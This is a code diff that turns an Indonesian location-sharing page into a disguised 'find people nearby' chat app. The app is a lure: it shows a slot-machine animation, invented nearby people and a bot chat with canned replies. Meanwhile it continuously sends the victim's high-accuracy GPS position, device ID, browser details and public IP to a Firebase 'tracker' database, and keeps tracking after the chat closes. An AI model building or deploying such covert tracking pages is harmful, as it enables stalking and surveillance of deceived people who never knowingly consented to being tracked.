@@ -2,205 +2,564 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bagikan Lokasi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Temukan Orang Sekitar</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Poppins', sans-serif;
+            background: #0f0f1a;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            color: #fff;
         }
-        .card {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 30px;
-            max-width: 420px;
+        .container {
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            max-width: 420px;
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(24px);
+            border-radius: 40px;
+            padding: 36px 24px;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.08);
             text-align: center;
+            position: relative;
+            overflow: hidden;
+            min-height: 600px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.4s;
         }
-        .icon { font-size: 64px; margin-bottom: 16px; color: #764ba2; }
-        h1 { margin-bottom: 10px; font-weight: 600; color: #2d2d2d; }
+
+        /* Discover Screen */
+        .discover-screen, .slot-screen, .chat-screen {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+        }
+        .hidden { display: none !important; }
+
+        .radar-icon {
+            font-size: 70px;
+            filter: drop-shadow(0 0 20px #7c3aed);
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%,100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(to right, #c084fc, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.3;
+        }
+        .subtitle {
+            color: #a1a1aa;
+            font-size: 14px;
+        }
         .btn {
-            background: #764ba2;
-            color: white;
             border: none;
-            padding: 16px 32px;
-            border-radius: 50px;
+            padding: 18px 40px;
+            border-radius: 60px;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            transition: transform 0.2s;
-        }
-        .btn:active { transform: scale(0.97); }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
-            font-weight: 500;
-            background: #f3f4f6;
-            min-height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            letter-spacing: 0.3px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #7c3aed, #3b82f6);
+            color: white;
+            box-shadow: 0 12px 30px rgba(123, 58, 237, 0.5);
+        }
+        .btn-primary:active { transform: scale(0.96); }
+        .btn-primary:disabled {
+            background: #3f3f5e;
+            box-shadow: none;
+            color: #aaa;
+            cursor: not-allowed;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.25);
+            color: #ddd;
+            margin-top: 8px;
+        }
+
+        /* Slot machine (animasi jackpot) */
+        .slot-screen {
+            justify-content: center;
+        }
+        .slot-machine {
+            background: rgba(0,0,0,0.5);
+            border-radius: 28px;
+            padding: 30px 20px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: inset 0 0 30px rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+        }
+        .slot-display {
+            height: 90px;
+            overflow: hidden;
+            position: relative;
+            margin: 20px 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .slot-name {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(180deg, #fbbf24, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            white-space: nowrap;
+        }
+        .avatar-slot {
+            font-size: 56px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 12px #c084fc);
+        }
+        .status-text {
+            color: #aaa;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .spinner-icon {
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Hasil akhir di slot screen */
+        .result-box {
+            margin-top: 20px;
+            padding: 16px;
+            background: rgba(124, 58, 237, 0.2);
+            border-radius: 20px;
+            font-weight: 600;
+            border: 1px solid #7c3aed;
+            display: flex;
+            flex-direction: column;
             gap: 8px;
         }
-        .device-info {
-            margin-top: 16px;
-            font-size: 13px;
-            color: #555;
-            background: #f9f9f9;
-            padding: 10px;
-            border-radius: 10px;
-            text-align: left;
+
+        /* Chat screen */
+        .chat-screen {
+            justify-content: flex-start;
+            height: 100%;
         }
-        .pulse {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            background: #4CAF50;
+        .chat-header {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .back-btn {
+            background: none;
+            border: none;
+            color: #ccc;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        .chat-messages {
+            width: 100%;
+            height: 320px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 16px 6px;
+            flex: 1;
+        }
+        .message-bubble {
+            max-width: 80%;
+            padding: 12px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            line-height: 1.4;
+            word-break: break-word;
+        }
+        .message-sent {
+            align-self: flex-end;
+            background: #7c3aed;
+            color: white;
+            border-bottom-right-radius: 4px;
+        }
+        .message-received {
+            align-self: flex-start;
+            background: #2a2a40;
+            color: #eee;
+            border-bottom-left-radius: 4px;
+        }
+        .chat-input-area {
+            width: 100%;
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+        }
+        .chat-input {
+            flex: 1;
+            padding: 14px 18px;
+            border-radius: 30px;
+            border: none;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 15px;
+            outline: none;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        .send-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #7c3aed;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .tracking-indicator {
+            margin-top: 10px;
+            font-size: 11px;
+            color: #9ca3af;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
             border-radius: 50%;
             animation: pulse 1.5s infinite;
-            margin-right: 6px;
         }
         @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(76,175,80,0.5); }
-            70% { box-shadow: 0 0 0 10px rgba(76,175,80,0); }
-            100% { box-shadow: 0 0 0 0 rgba(76,175,80,0); }
+            0% { box-shadow: 0 0 0 0 rgba(16,185,129,0.7); }
+            70% { box-shadow: 0 0 0 8px rgba(16,185,129,0); }
+            100% { box-shadow: 0 0 0 0 rgba(16,185,129,0); }
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
 </head>
 <body>
-    <div class="card">
-        <div class="icon">📍</div>
-        <h1>Bagikan Lokasi</h1>
-        <p style="color: #666;">Lokasi dikirim setiap 10 detik</p>
-        <div class="device-info" id="deviceInfo">
-            <i class="fas fa-mobile-alt"></i> <span id="deviceIdDisplay">...</span>
-            <br><small id="ipDisplay">Mengambil IP...</small>
-        </div>
-        <button class="btn" id="btnMulai" onclick="mulaiBagikan()">
-            <i class="fas fa-play"></i> Mulai Berbagi
+<div class="container" id="mainContainer">
+
+    <!-- HALAMAN DISCOVER (AWAL) -->
+    <div id="discoverScreen" class="discover-screen">
+        <div class="radar-icon">📡</div>
+        <h1>Temukan Orang Sekitar</h1>
+        <div class="subtitle">Ngobrol seru dengan yang lagi di dekatmu sekarang</div>
+        <button class="btn btn-primary" id="btnFind">
+            <i class="fas fa-search-location"></i> Cari Sekarang
         </button>
-        <div class="status" id="status">
-            <span>⏳ Siap...</span>
+        <div class="tracking-indicator" id="trackingStatusDiscover">
+            <span class="pulse-dot" style="display:none;" id="pulseDiscover"></span>
+            <span id="statusDiscover">Lokasi diperlukan untuk menemukan teman</span>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    <!-- HALAMAN SLOT / JACKPOT -->
+    <div id="slotScreen" class="slot-screen hidden">
+        <div class="slot-machine">
+            <div class="avatar-slot" id="avatarSlot">👤</div>
+            <div class="slot-display">
+                <span class="slot-name" id="slotName">Mencari...</span>
+            </div>
+            <div class="status-text" id="slotStatus">
+                <i class="fas fa-spinner spinner-icon"></i> <span id="slotStatusText">Menunggu izin lokasi...</span>
+            </div>
+        </div>
+        <div id="resultBox" class="result-box hidden">
+            <span id="resultText"></span>
+        </div>
+        <button class="btn btn-outline hidden" id="btnRetry" onclick="resetToDiscover()">
+            <i class="fas fa-redo-alt"></i> Coba Lagi
+        </button>
+    </div>
 
-        // ⚠️ Ganti dengan URL database kamu
-        const firebaseConfig = {
-            databaseURL: "https://lokaci-39db8-default-rtdb.asia-southeast1.firebasedatabase.app/"
-        };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+    <!-- HALAMAN CHAT (PALSU) -->
+    <div id="chatScreen" class="chat-screen hidden">
+        <div class="chat-header">
+            <button class="back-btn" onclick="kembaliDariChat()"><i class="fas fa-arrow-left"></i></button>
+            <div style="display:flex; align-items:center; gap:10px;">
+                <span id="chatAvatar" style="font-size:32px;">👤</span>
+                <div>
+                    <div id="chatPartnerName" style="font-weight:600;">...</div>
+                    <div style="font-size:12px; color:#6ee7b7;">online</div>
+                </div>
+            </div>
+            <div style="width:40px;"></div>
+        </div>
+        <div id="chatMessages" class="chat-messages"></div>
+        <div class="chat-input-area">
+            <input type="text" id="chatInput" class="chat-input" placeholder="Ketik pesan..." autocomplete="off">
+            <button class="send-btn" onclick="kirimPesan()"><i class="fas fa-paper-plane"></i></button>
+        </div>
+    </div>
+</div>
 
-        const SECRET_ROOM = "yo"; // ganti dengan kata sandi kalian
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        // Generate / ambil device ID dari localStorage
-        let DEVICE_ID = localStorage.getItem('tracker_device_id');
-        if (!DEVICE_ID) {
-            DEVICE_ID = 'device_' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem('tracker_device_id', DEVICE_ID);
+    // ⚠️ GANTI DENGAN URL FIREBASE KAMU
+    const firebaseConfig = {
+        databaseURL: "https://tracker-xxxx-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const SECRET_ROOM = "yo";
+
+    // Device & IP
+    let DEVICE_ID = localStorage.getItem('tracker_device_id');
+    if (!DEVICE_ID) {
+        DEVICE_ID = 'device_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('tracker_device_id', DEVICE_ID);
+    }
+    let publicIP = 'Tidak diketahui';
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => { publicIP = data.ip; })
+        .catch(() => {});
+
+    const deviceInfo = {
+        deviceId: DEVICE_ID,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        ip: publicIP
+    };
+
+    // State tracking
+    let trackingActive = false;
+    let watchId = null;
+
+    function mulaiTracking() {
+        if (trackingActive) return;
+        if (!navigator.geolocation) {
+            alert("Geolokasi tidak didukung.");
+            return;
         }
-        document.getElementById('deviceIdDisplay').textContent = 'ID: ' + DEVICE_ID;
+        deviceInfo.ip = publicIP;
+        set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/info`), deviceInfo);
+        watchId = navigator.geolocation.watchPosition(
+            (pos) => {
+                const { latitude, longitude } = pos.coords;
+                set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/position`), {
+                    lat: latitude,
+                    lng: longitude,
+                    timestamp: Date.now()
+                });
+            },
+            (err) => console.warn("Tracking error:", err.message),
+            { enableHighAccuracy: true, maximumAge: 5000, timeout: 8000 }
+        );
+        trackingActive = true;
+        document.getElementById('pulseDiscover').style.display = 'inline-block';
+        document.getElementById('statusDiscover').textContent = 'Lokasi kamu aktif';
+    }
 
-        // Ambil IP publik (opsional, mungkin gagal di beberapa jaringan)
-        let publicIP = 'Tidak diketahui';
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                publicIP = data.ip;
-                document.getElementById('ipDisplay').textContent = 'IP: ' + publicIP;
-            })
-            .catch(() => {
-                document.getElementById('ipDisplay').textContent = 'IP: Gagal didapat';
-            });
+    window.addEventListener('beforeunload', () => {
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+    });
 
-        const deviceInfo = {
-            deviceId: DEVICE_ID,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            ip: publicIP  // akan diperbarui setelah fetch
-        };
+    // Data orang palsu
+    const fakePeople = [
+        { name: "Rina Maulina", avatar: "👩", distance: 120 },
+        { name: "Budi Santoso", avatar: "🧑", distance: 230 },
+        { name: "Sari Dewi", avatar: "👩‍🦰", distance: 95 },
+        { name: "Andi Pratama", avatar: "👨", distance: 340 },
+        { name: "Fitriani", avatar: "👩‍🦱", distance: 180 },
+        { name: "Dimas Anggara", avatar: "🧔", distance: 410 },
+        { name: "Lestari", avatar: "👧", distance: 55 },
+        { name: "Rudi Hartono", avatar: "👨‍🦱", distance: 280 },
+    ];
 
-        let intervalId = null;
+    // ========== SLOT MACHINE LOGIC ==========
+    let slotInterval = null;
+    let selectedPerson = null;
+    let slotRunning = false;
 
-        window.mulaiBagikan = function() {
-            const btn = document.getElementById("btnMulai");
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Memulai...';
+    function startSlotMachine() {
+        if (slotRunning) return;
+        slotRunning = true;
+        const nameEl = document.getElementById('slotName');
+        const avatarEl = document.getElementById('avatarSlot');
+        let counter = 0;
+        // Ganti nama dan avatar dengan cepat
+        slotInterval = setInterval(() => {
+            const randomPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
+            nameEl.textContent = randomPerson.name;
+            avatarEl.textContent = randomPerson.avatar;
+        }, 60); // kecepatan efek slot
+    }
 
-            if (!navigator.geolocation) {
-                document.getElementById("status").innerHTML = "❌ Geolokasi tidak didukung";
+    function stopSlotMachine(person) {
+        if (!slotRunning) return;
+        clearInterval(slotInterval);
+        slotInterval = null;
+        slotRunning = false;
+        document.getElementById('slotName').textContent = person.name;
+        document.getElementById('avatarSlot').textContent = person.avatar;
+        // Tampilkan hasil
+        const distance = Math.floor(Math.random() * 450) + 50; // 50-500 meter
+        document.getElementById('resultText').innerHTML =
+            `🎉 Kamu terhubung dengan <strong>${person.name}</strong>!<br>📍 Jarak sekitar <strong>${distance} meter</strong>`;
+        document.getElementById('resultBox').classList.remove('hidden');
+        document.getElementById('slotStatus').innerHTML = '<span style="color:#10b981;">●</span> <span>Tersambung</span>';
+
+        // Otomatis masuk chat setelah 2 detik
+        setTimeout(() => {
+            masukChat(person);
+        }, 2000);
+    }
+
+    function masukChat(person) {
+        document.getElementById('slotScreen').classList.add('hidden');
+        document.getElementById('chatScreen').classList.remove('hidden');
+        document.getElementById('chatPartnerName').textContent = person.name;
+        document.getElementById('chatAvatar').textContent = person.avatar;
+        document.getElementById('chatMessages').innerHTML = '';
+        // Bot kirim pesan pembuka
+        setTimeout(() => {
+            tambahPesanDariLawan(`Hai! Kayaknya kita deketan nih, asik ngobrol bareng!`);
+        }, 800);
+    }
+
+    // ========== EVENT TOMBOL CARI ==========
+    document.getElementById('btnFind').addEventListener('click', () => {
+        const btn = document.getElementById('btnFind');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Meminta izin...';
+
+        // Tampilkan slot screen
+        document.getElementById('discoverScreen').classList.add('hidden');
+        document.getElementById('slotScreen').classList.remove('hidden');
+        document.getElementById('resultBox').classList.add('hidden');
+        document.getElementById('btnRetry').classList.add('hidden');
+        document.getElementById('slotStatus').innerHTML = '<i class="fas fa-spinner spinner-icon"></i> <span id="slotStatusText">Menunggu izin lokasi...</span>';
+        document.getElementById('slotName').textContent = '...';
+        document.getElementById('avatarSlot').textContent = '👤';
+
+        // Mulai animasi slot dulu (terus berputar)
+        startSlotMachine();
+
+        // Minta izin lokasi
+        if (!navigator.geolocation) {
+            setSlotError("Geolokasi tidak didukung");
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                // Izin diberikan, mulai tracking
+                mulaiTracking();
+                // Pilih orang acak
+                selectedPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
+                // Hentikan slot setelah sedikit delay biar dramatis
+                setTimeout(() => {
+                    stopSlotMachine(selectedPerson);
+                }, 2000); // putar dulu 2 detik
+                // Update status tombol
                 btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-play"></i> Mulai Berbagi';
-                return;
-            }
+                btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
+            },
+            (err) => {
+                // Izin ditolak / error
+                setSlotError("Izin lokasi diperlukan. Coba lagi.");
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
+                // Tetap putar tanpa henti (animasi slot tetap berjalan)
+                document.getElementById('slotStatus').innerHTML = '<span style="color:#ef4444;">⚠️</span> <span>Izin lokasi ditolak</span>';
+                document.getElementById('btnRetry').classList.remove('hidden');
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    });
 
-            // Update IP di deviceInfo setelah fetch selesai (jika sudah)
-            deviceInfo.ip = publicIP;
+    function setSlotError(msg) {
+        document.getElementById('slotStatus').innerHTML = `<span style="color:#ef4444;">⚠️</span> <span>${msg}</span>`;
+        document.getElementById('btnRetry').classList.remove('hidden');
+    }
 
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    kirimLokasi(pos.coords.latitude, pos.coords.longitude);
-                    document.getElementById("status").innerHTML = '<span class="pulse"></span> Lokasi sedang dibagikan...';
-                    btn.innerHTML = '<i class="fas fa-check"></i> Berjalan';
-                },
-                err => {
-                    document.getElementById("status").innerHTML = "❌ Gagal: " + err.message;
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-play"></i> Coba Lagi';
-                    return;
-                },
-                { enableHighAccuracy: true }
-            );
+    // Tombol "Coba Lagi" mengembalikan ke discover screen
+    window.resetToDiscover = function() {
+        clearInterval(slotInterval);
+        slotRunning = false;
+        document.getElementById('slotScreen').classList.add('hidden');
+        document.getElementById('discoverScreen').classList.remove('hidden');
+    };
 
-            if (intervalId) clearInterval(intervalId);
-            intervalId = setInterval(() => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => kirimLokasi(pos.coords.latitude, pos.coords.longitude),
-                    err => console.warn("Update error:", err.message),
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            }, 10000);
-        };
+    // Dari chat bisa kembali ke discover (dengan tracking tetap jalan)
+    window.kembaliDariChat = function() {
+        document.getElementById('chatScreen').classList.add('hidden');
+        document.getElementById('discoverScreen').classList.remove('hidden');
+    };
 
-        function kirimLokasi(lat, lng) {
-            // Simpan info device (hanya sekali, tapi bisa diupdate)
-            set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/info`), {
-                ...deviceInfo,
-                ip: publicIP  // selalu perbarui IP
-            });
-            // Simpan posisi terbaru
-            set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/position`), {
-                lat: lat,
-                lng: lng,
-                timestamp: Date.now()
-            });
-        }
+    // ========== CHAT FUNGSI ==========
+    window.kirimPesan = function() {
+        const input = document.getElementById('chatInput');
+        const teks = input.value.trim();
+        if (!teks) return;
+        tambahPesan(teks, 'sent');
+        input.value = '';
+        // Balasan acak
+        const balasanAcak = [
+            "Oh gitu ya, haha",
+            "Serius? Cerita dong",
+            "Wah keren juga",
+            "Sama dong, aku juga suka",
+            "Hmm, nggak nyangka",
+            "Kita deket banget loh ternyata",
+            "Jadi penasaran",
+            "Iya ya, bener banget",
+            "Ngomong-ngomong, lagi ngapain?",
+        ];
+        setTimeout(() => {
+            const balasan = balasanAcak[Math.floor(Math.random() * balasanAcak.length)];
+            tambahPesanDariLawan(balasan);
+        }, 1500 + Math.random() * 2000);
+    };
 
-        window.addEventListener("beforeunload", () => {
-            if (intervalId) clearInterval(intervalId);
-            // Hapus data device saat keluar (opsional)
-            // set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}`), null);
-        });
-    </script>
+    function tambahPesan(teks, tipe) {
+        const container = document.getElementById('chatMessages');
+        const div = document.createElement('div');
+        div.className = `message-bubble message-${tipe}`;
+        div.textContent = teks;
+        container.appendChild(div);
+        container.scrollTop = container.scrollHeight;
+    }
+
+    function tambahPesanDariLawan(teks) {
+        tambahPesan(teks, 'received');
+    }
+
+    document.getElementById('chatInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') window.kirimPesan();
+    });
+</script>
 </body>
 </html>
